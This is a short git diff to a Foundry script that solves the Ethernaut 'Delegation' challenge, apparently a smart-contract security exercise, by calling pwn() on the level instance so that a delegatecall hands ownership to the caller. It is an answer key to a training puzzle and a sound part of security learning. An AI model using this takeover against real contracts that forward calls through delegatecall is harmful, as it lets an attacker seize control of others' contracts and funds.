@@ -5,6 +5,9 @@ import {Script, console2} from "forge-std/Script.sol";
 import {EthernautHelper} from "../setup/EthernautHelper.sol";
 
 // NOTE You can import your helper contracts & create interfaces here
+interface Delegation {
+    function pwn() external;
+}
 
 contract DelegationSolution is Script, EthernautHelper {
     address constant LEVEL_ADDRESS = 0x73379d8B82Fda494ee59555f333DF7D44483fD58;
@@ -16,7 +19,7 @@ contract DelegationSolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-        
+        Delegation(challengeInstance).pwn();
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
